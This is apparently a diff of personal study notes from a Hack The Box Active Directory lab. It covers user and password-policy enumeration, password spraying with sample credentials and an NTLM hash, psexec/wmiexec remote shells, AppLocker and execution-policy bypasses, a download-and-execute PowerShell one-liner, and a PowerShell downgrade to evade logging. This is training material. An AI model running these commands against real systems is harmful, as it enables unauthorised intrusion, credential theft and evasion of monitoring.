-## **Enumerating the Password Policy - from Linux - SMB NULL Sessions ⭐**
+### **Enumerating the Password Policy - from Linux - SMB NULL Sessions ⭐**
 
 Without valid credentials, we can get password policy using SMB NULL sessions
 
 SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
 
-- `rpcclient -U "" -N 172.16.5.5`
-- then run rpc command such as `querydominfo` to confirm NULL sessions access
-- then rpc command`getdompwinfo` gives us the password policy.
+* `rpcclient -U "" -N 172.16.5.5`
+* then run rpc command such as `querydominfo` to confirm NULL sessions access
+* then rpc command`getdompwinfo` gives us the password policy.
 
-### Using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux) ⭐
+#### Using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux) ⭐
 
-- `enum4linux -P 172.16.5.5` -p flag specifies for password policy
+* `enum4linux -P 172.16.5.5` -p flag specifies for password policy
 
-### Using [enum4linux](https://github.com/cddmp/enum4linux-ng)-ng
+#### Using [enum4linux](https://github.com/cddmp/enum4linux-ng)-ng
 
-- `enum4linux-ng -P 172.16.5.5 -oA ilfreight` → enum4linux-ng is rewrite of enum4linux in python with additional features like export.
+* `enum4linux-ng -P 172.16.5.5 -oA ilfreight` → enum4linux-ng is rewrite of enum4linux in python with additional features like export.
 
-## **Enumerating Null Session - from Windows**
+### **Enumerating Null Session - from Windows**
 
 uncommon to do null session attack from windows.
 
-- `C:\htb> net use \\DC01\ipc$ "" /u:""` → establishing null sessions
+* `C:\htb> net use \\DC01\ipc$ "" /u:""` → establishing null sessions
 
-## **Enumerating the Password Policy - from Linux - LDAP Anonymous Bind**
+### **Enumerating the Password Policy - from Linux - LDAP Anonymous Bind**
 
-### **Using ldapsearch**
+#### **Using ldapsearch**
 
-- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
+* `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
 
-## **Enumerating the Password Policy - from Windows ⭐**
+### **Enumerating the Password Policy - from Windows ⭐**
 
 If we are authenticated to the domain from a windows host, we can use `net.exe` to retrieve the password policy.
 
@@ -222,74 +221,58 @@ Computer role:                                        SERVER
 The command completed successfully.
 ```
 
-## Password Spraying - Making a Target User List
+### Password Spraying - Making a Target User List
 
-<aside>
-1️⃣ **SMB NULL Session to Pull User List**
+1️⃣ \*\*SMB NULL Session to Pull User List\*\*
 
-</aside>
+#### **Using enum4linux**
 
-### **Using enum4linux**
+* `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
 
-- `enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
-
-### **Using rpcclient**
+#### **Using rpcclient**
 
 ```
 dollarboysushil@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
 rpcclient$> enumdomusers
 ```
 
-### **Using CrackMapExec --users Flag**
+#### **Using CrackMapExec --users Flag**
 
-- `crackmapexec smb 172.16.5.5 --users`
+* `crackmapexec smb 172.16.5.5 --users`
 
-<aside>
-2️⃣ **Gathering Users with LDAP Anonymous**
+2️⃣ \*\*Gathering Users with LDAP Anonymous\*\*
 
-</aside>
+#### **Using ldapsearch**
 
-### **Using ldapsearch**
-
-- `dollarboysushil@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`
+* `dollarboysushil@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "`
 
 it is easier to use windapsearch
 
-### **Using windapsearch**
+#### **Using windapsearch**
 
-- `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`
+* `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`
 
-<aside>
-3️⃣ **Enumerating Users with Kerbrute ⭐**
+3️⃣ \*\*Enumerating Users with Kerbrute ⭐\*\*
 
-</aside>
-
-if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.
-this tool uses Kerberos Per-Authentication, which is much faster and stealthier
+if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying. this tool uses Kerberos Per-Authentication, which is much faster and stealthier
 
 this method does not generate Windows event ID or logon failure.
 
-The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid.
+The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid.
 
-- `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
+* `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
 
-<aside>
-4️⃣ **Credentialed Enumeration to Build our User List**
-
-</aside>
+4️⃣ \*\*Credentialed Enumeration to Build our User List\*\*
 
 Once we get valid credential, we can use various tools to build get the user from AD
 
-- `sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users` → this will give the list of users
+* `sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users` → this will give the list of users
 
-# **Spray Responsibly**
+## **Spray Responsibly**
 
-## **Internal Password Spraying - from Linux**
+### **Internal Password Spraying - from Linux**
 
-<aside>
-1️⃣ **Using Kerbrute for the Attack ⭐**
-
-</aside>
+1️⃣ \*\*Using Kerbrute for the Attack ⭐\*\*
 
 ```
 dollarboysushil@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
@@ -308,10 +291,7 @@ Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
 2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
 ```
 
-<aside>
-2️⃣ **Using CrackMapExec & Filtering Logon Failures ⭐**
-
-</aside>
+2️⃣ \*\*Using CrackMapExec & Filtering Logon Failures ⭐\*\*
 
 ```
 dollarboysushil@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
@@ -327,10 +307,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
 ```
 
-<aside>
-3️⃣ **Local Admin Spraying with CrackMapExec**
-
-</aside>
+3️⃣ \*\*Local Admin Spraying with CrackMapExec\*\*
 
 ```
 dollarboysushil@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
@@ -340,14 +317,11 @@ SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administ
 SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
 ```
 
- The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout
+&#x20;The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout
 
-## **Internal Password Spraying - from Windows**
+### **Internal Password Spraying - from Windows**
 
-<aside>
-1️⃣ **Using DomainPasswordSpray.ps1**
-
-</aside>
+1️⃣ \*\*Using DomainPasswordSpray.ps1\*\*
 
 ```powershell
 PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
@@ -378,439 +352,372 @@ Are you sure you want to perform a password spray against 2923 accounts?
 [*] Any passwords that were successfully sprayed have been output to spray_success
 ```
 
-# **Deeper Down the Rabbit Hole**
+## **Deeper Down the Rabbit Hole**
 
-- `PS C:\htb> Get-MpComputerStatus`→ check the status of windows defender
-- Applocker is Microsoft’s application whitelisting solution. Using Applocker, organization blocks cmd.exe, powershell.exe etc.
-    
+* `PS C:\htb> Get-MpComputerStatus`→ check the status of windows defender
+*   Applocker is Microsoft’s application whitelisting solution. Using Applocker, organization blocks cmd.exe, powershell.exe etc.
+
     we can bypass this, lets say `Powershell.exe` is blocked, then we use powershell’s other executable locations such as;
-    
-    `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. 
-    
-- `PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 
-# **LAPS** `Local Administrator Password Solution`
+    `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.&#x20;
+* `PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 
-- is used to randomize and rotate local administrator passwords on windows hosts and prevent lateral movement.
+## **LAPS** `Local Administrator Password Solution`
 
-| Command | Description |
-| --- | --- |
-| Get-MpComputerStatus | PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host. |
-| Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | PowerShell cmd-let used to view AppLocker policies from a Windows-based host. |
-| $ExecutionContext.SessionState.LanguageMode | PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host. |
-| Find-LAPSDelegatedGroups | A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host. |
-| Find-AdmPwdExtendedRights | A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host. |
-| Get-LAPSComputers | A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |
+* is used to randomize and rotate local administrator passwords on windows hosts and prevent lateral movement.
 
-# **Credentialed Enumeration - from Linux**
+| Command                                     | Description                                                                                                                                                                              |
+| ------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Get-MpComputerStatus                        | PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.                                                                                    |
+| Get-AppLockerPolicy -Effective              | select -ExpandProperty RuleCollections                                                                                                                                                   |
+| $ExecutionContext.SessionState.LanguageMode | PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.                                                 |
+| Find-LAPSDelegatedGroups                    | A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.                                                                                                   |
+| Find-AdmPwdExtendedRights                   | A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host. |
+| Get-LAPSComputers                           | A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.      |
 
-<aside>
-1️⃣ **CrackMapExec**
+## **Credentialed Enumeration - from Linux**
 
-</aside>
+1️⃣ \*\*CrackMapExec\*\*
 
-- `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` → Domain user Enumeration
-    
+*   `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` → Domain user Enumeration
+
     Gives the list of users in domain with attribute `badPwdCount`
-    
-- `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` → Domain Group Enumeration
-    
+*   `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` → Domain Group Enumeration
+
     gives us list of groups with number of users in each.
-    
-- `sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users` → lists what users are logged in currently.
-- `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` → enumerate available shares on the remote host and the level of access our user account has to each share
-- `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus`
-    
-    This will dig through each readable share on the host and list all readable file, we can also give specific share to spider e.g.  `--share 'Department Shares'` 
-    
+* `sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users` → lists what users are logged in currently.
+* `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` → enumerate available shares on the remote host and the level of access our user account has to each share
+*   `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus`
+
+    This will dig through each readable share on the host and list all readable file, we can also give specific share to spider e.g. `--share 'Department Shares'`
+
     output is located at `/tmp/cme_spider_plus/<ip of host>`
-    
 
-<aside>
-2️⃣ **SMBMap**
+2️⃣ \*\*SMBMap\*\*
 
-</aside>
+* `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` → this will tell us what our user can access and their permission levels.
+*   `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`
 
-- `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` → this will tell us what our user can access and their permission levels.
-- `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`
-    
-     it will show you the output of all subdirectories within the higher-level directories.
-    
-     `--dir-only` provided only the output of all directories and did not list all files.
-    
+    it will show you the output of all subdirectories within the higher-level directories.
 
-<aside>
-3️⃣ **rpcclient**
+    &#x20;`--dir-only` provided only the output of all directories and did not list all files.
 
-</aside>
+3️⃣ \*\*rpcclient\*\*
 
-[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. 
+[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD.&#x20;
 
-- `rpcclient -U "" -N 172.16.5.5` → gives us null session shell on our DC using ms-rpc
-- `rpcclient **$**> queryuser 0x457` → user enumeration by RID, here hex 0x457 equals to decimal 111
-    
+* `rpcclient -U "" -N 172.16.5.5` → gives us null session shell on our DC using ms-rpc
+*   `rpcclient **$**> queryuser 0x457` → user enumeration by RID, here hex 0x457 equals to decimal 111
+
     This will give info about user having RID 0x457 or decimal 111
-    
-- `rpcclient$> enumdomusers` → this will list all users along with their RID.
+* `rpcclient$> enumdomusers` → this will list all users along with their RID.
 
-<aside>
-4️⃣ **Impacket Toolkit**
+4️⃣ \*\*Impacket Toolkit\*\*
 
-</aside>
+### Psexec.py
 
-## Psexec.py
+The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
 
-The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
+* `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` → gives us shell
 
-- `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` → gives us shell
+### **wmiexec.py**
 
-## **wmiexec.py**
+Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules.&#x20;
 
-Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. 
+* `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` → gives us shell
 
-- `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` → gives us shell
+5️⃣ \*\*Windapsearch\*\*
 
-<aside>
-5️⃣ **Windapsearch**
+[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
 
-</aside>
+*   `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da` → gives users from domain admin group
 
-[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
-
-- `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da` → gives users from domain admin group
-    
     `--da` = enumerate domain admins group members
-    
-- `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU` → check for users with elevated privileges
-    
+*   `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU` → check for users with elevated privileges
+
     `-PU` = find privileged users
-    
 
-<aside>
-6️⃣ **Bloodhound.py**
+6️⃣ \*\*Bloodhound.py\*\*
 
-</aside>
+It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).
 
-It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).
+*   `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` → executing bloodhound.py
 
-- `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` → executing bloodhound.py
-    
     `-ns` = nameserver
-    
+
     `-d` = domain
-    
+
     `-c` = checks; all checks in this case.
-    
 
 we will get various json file
 
-- `zip -r ilfreight_bh.zip *.json` → zip up the json file.
-    
-    
+* `zip -r ilfreight_bh.zip *.json` → zip up the json file.
 
-# **Credentialed Enumeration - from Windows**
+## **Credentialed Enumeration - from Windows**
 
-<aside>
-1️⃣ **ActiveDirectory PowerShell Module**
+1️⃣ \*\*ActiveDirectory PowerShell Module\*\*
 
-</aside>
+* `Get-Module` → list all available modules
+* `Import-Module ActiveDirectory` → import ActiveDirectory module if not imported.
+* `Get-ADDomain` → Get basic info about the domain.
+* `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`→ lists account that are susceptible to a Kerberoasting attack.
+* `Get-ADTrust -Filter *` → checking for trust relationships
+* `Get-ADGroup -Filter * | select name` → Group Enumeration
+* `Get-ADGroup -Identity "Backup Operators"` → Detailed Group Enumeration
+* `Get-ADGroupMember -Identity "Backup Operators"` → List Group Membership
 
-- `Get-Module` → list all available modules
-- `Import-Module ActiveDirectory` → import ActiveDirectory module if not imported.
+2️⃣ \*\*PowerView\*\*
 
-- `Get-ADDomain` → Get basic info about the domain.
-- `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`→ lists account that are susceptible to a Kerberoasting attack.
+[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment
 
-- `Get-ADTrust -Filter *` → checking for trust relationships
+| Command                         | Description                                                                                |
+| ------------------------------- | ------------------------------------------------------------------------------------------ |
+| Export-PowerViewCSV             | Append results to a CSV file                                                               |
+| ConvertTo-SID                   | Convert a User or group name to its SID value                                              |
+| Get-DomainSPNTicket             | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
+| Domain/LDAP Functions:          |                                                                                            |
+| Get-Domain                      | Will return the AD object for the current (or specified) domain                            |
+| Get-DomainController            | Return a list of the Domain Controllers for the specified domain                           |
+| Get-DomainUser                  | Will return all users or specific user objects in AD                                       |
+| Get-DomainComputer              | Will return all computers or specific computer objects in AD                               |
+| Get-DomainGroup                 | Will return all groups or specific group objects in AD                                     |
+| Get-DomainOU                    | Search for all or specific OU objects in AD                                                |
+| Find-InterestingDomainAcl       | Finds object ACLs in the domain with modification rights set to non-built in objects       |
+| Get-DomainGroupMember           | Will return the members of a specific domain group                                         |
+| Get-DomainFileServer            | Returns a list of servers likely functioning as file servers                               |
+| Get-DomainDFSShare              | Returns a list of all distributed file systems for the current (or specified) domain       |
+| GPO Functions:                  |                                                                                            |
+| Get-DomainGPO                   | Will return all GPOs or specific GPO objects in AD                                         |
+| Get-DomainPolicy                | Returns the default domain policy or the domain controller policy for the current domain   |
+| Computer Enumeration Functions: |                                                                                            |
+| Get-NetLocalGroup               | Enumerates local groups on the local or a remote machine                                   |
+| Get-NetLocalGroupMember         | Enumerates members of a specific local group                                               |
+| Get-NetShare                    | Returns open shares on the local (or a remote) machine                                     |
+| Get-NetSession                  | Will return session information for the local (or a remote) machine                        |
+| Test-AdminAccess                | Tests if the current user has administrative access to the local (or a remote) machine     |
+| Threaded 'Meta'-Functions:      |                                                                                            |
+| Find-DomainUserLocation         | Finds machines where specific users are logged in                                          |
+| Find-DomainShare                | Finds reachable shares on domain machines                                                  |
+| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain             |
+| Find-LocalAdminAccess           | Find machines on the local domain where the current user has local administrator access    |
+| Domain Trust Functions:         |                                                                                            |
+| Get-DomainTrust                 | Returns domain trusts for the current domain or a specified domain                         |
+| Get-ForestTrust                 | Returns all forest trusts for the current forest or a specified forest                     |
+| Get-DomainForeignUser           | Enumerates users who are in groups outside of the user's domain                            |
+| Get-DomainForeignGroupMember    | Enumerates groups with users outside of the group's domain and returns each foreign member |
+| Get-DomainTrustMapping          | Will enumerate all trusts for the current domain and any others seen.                      |
 
-- `Get-ADGroup -Filter * | select name` → Group Enumeration
-- `Get-ADGroup -Identity "Backup Operators"` → Detailed Group Enumeration
-
-- `Get-ADGroupMember -Identity "Backup Operators"` → List Group Membership
-
-<aside>
-2️⃣ **PowerView**
-
-</aside>
-
-[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment
-
-| Command | Description |
-| --- | --- |
-| Export-PowerViewCSV | Append results to a CSV file |
-| ConvertTo-SID | Convert a User or group name to its SID value |
-| Get-DomainSPNTicket | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
-| Domain/LDAP Functions: |  |
-| Get-Domain | Will return the AD object for the current (or specified) domain |
-| Get-DomainController | Return a list of the Domain Controllers for the specified domain |
-| Get-DomainUser | Will return all users or specific user objects in AD |
-| Get-DomainComputer | Will return all computers or specific computer objects in AD |
-| Get-DomainGroup | Will return all groups or specific group objects in AD |
-| Get-DomainOU | Search for all or specific OU objects in AD |
-| Find-InterestingDomainAcl | Finds object ACLs in the domain with modification rights set to non-built in objects |
-| Get-DomainGroupMember | Will return the members of a specific domain group |
-| Get-DomainFileServer | Returns a list of servers likely functioning as file servers |
-| Get-DomainDFSShare | Returns a list of all distributed file systems for the current (or specified) domain |
-| GPO Functions: |  |
-| Get-DomainGPO | Will return all GPOs or specific GPO objects in AD |
-| Get-DomainPolicy | Returns the default domain policy or the domain controller policy for the current domain |
-| Computer Enumeration Functions: |  |
-| Get-NetLocalGroup | Enumerates local groups on the local or a remote machine |
-| Get-NetLocalGroupMember | Enumerates members of a specific local group |
-| Get-NetShare | Returns open shares on the local (or a remote) machine |
-| Get-NetSession | Will return session information for the local (or a remote) machine |
-| Test-AdminAccess | Tests if the current user has administrative access to the local (or a remote) machine |
-| Threaded 'Meta'-Functions: |  |
-| Find-DomainUserLocation | Finds machines where specific users are logged in |
-| Find-DomainShare | Finds reachable shares on domain machines |
-| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain |
-| Find-LocalAdminAccess | Find machines on the local domain where the current user has local administrator access |
-| Domain Trust Functions: |  |
-| Get-DomainTrust | Returns domain trusts for the current domain or a specified domain |
-| Get-ForestTrust | Returns all forest trusts for the current forest or a specified forest |
-| Get-DomainForeignUser | Enumerates users who are in groups outside of the user's domain |
-| Get-DomainForeignGroupMember | Enumerates groups with users outside of the group's domain and returns each foreign member |
-| Get-DomainTrustMapping | Will enumerate all trusts for the current domain and any others seen. |
-
-<aside>
-3️⃣ **SharpView**
-
-</aside>
+3️⃣ \*\*SharpView\*\*
 
 Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView
 
-- `PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend` → get info about specific user
+* `PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend` → get info about specific user
 
-<aside>
-4️⃣ **Snaffler**
+4️⃣ \*\*Snaffler\*\*
 
-</aside>
+[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment
 
-[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment
+* `Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`
 
-- `Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`
+5️⃣ \*\*BloodHound ⭐\*\*
 
-<aside>
-5️⃣ **BloodHound ⭐**
-
-</aside>
-
-- `PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT` → running sharphound collector from MS01 attack host
+* `PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT` → running sharphound collector from MS01 attack host
 
 Then transfer the data to our attacking host and open in bloodhound.
 
-# **Living Off the Land**
+## **Living Off the Land**
 
 [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
 
-### **Basic Enumeration Commands**
+#### **Basic Enumeration Commands**
 
-| Command | Result |
-| --- | --- |
-| hostname | Prints the PC's Name |
-| [System.Environment]::OSVersion.Version | Prints out the OS version and revision level |
-| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host |
-| ipconfig /all | Prints out network adapter state and configurations |
-| set | Displays a list of environment variables for the current session (ran from CMD-prompt) |
-| echo %USERDOMAIN% | Displays the domain name to which the host belongs (ran from CMD-prompt) |
-| echo %logonserver% | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
-- `systeminfo` → will print a summary of the hosts information for us in one tidy output
+| Command                                               | Result                                                                                     |
+| ----------------------------------------------------- | ------------------------------------------------------------------------------------------ |
+| hostname                                              | Prints the PC's Name                                                                       |
+| \[System.Environment]::OSVersion.Version              | Prints out the OS version and revision level                                               |
+| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host                                        |
+| ipconfig /all                                         | Prints out network adapter state and configurations                                        |
+| set                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
+| echo %USERDOMAIN%                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
+| echo %logonserver%                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
 
-| Cmd-Let | Description |
-| --- | --- |
-| Get-Module | Lists available modules loaded for use. |
-| Get-ExecutionPolicy -List | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. |
-| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
-| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
-| Get-ChildItem Env: | ft Key,Value | Return environment values such as key paths, users, computer information, etc. |
-| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |
+* `systeminfo` → will print a summary of the hosts information for us in one tidy output
 
-### **Downgrade Powershell**
+| Cmd-Let                                                                                                          | Description                                                                                                                                                                                                                                 |
+| ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Get-Module                                                                                                       | Lists available modules loaded for use.                                                                                                                                                                                                     |
+| Get-ExecutionPolicy -List                                                                                        | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.2 settings for each scope on a host.                                                         |
+| Set-ExecutionPolicy Bypass -Scope Process                                                                        | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
+| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost\_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                     |
+| Get-ChildItem Env:                                                                                               | ft Key,Value                                                                                                                                                                                                                                |
+| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); "             | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                      |
+
+#### **Downgrade Powershell**
 
 If not uninstalled, there can be older version of powershell. Powershell event logging was introduces as a feature with powershell 3.0 and forward.
 
 If we can call Powershell version 2.0 or older, our action will not be logged into Event Viewer.
 
-- `Get-host` → displays the version of current powershell
-- `powershell.exe -version 2` → running version 2 of powershell.
+* `Get-host` → displays the version of current powershell
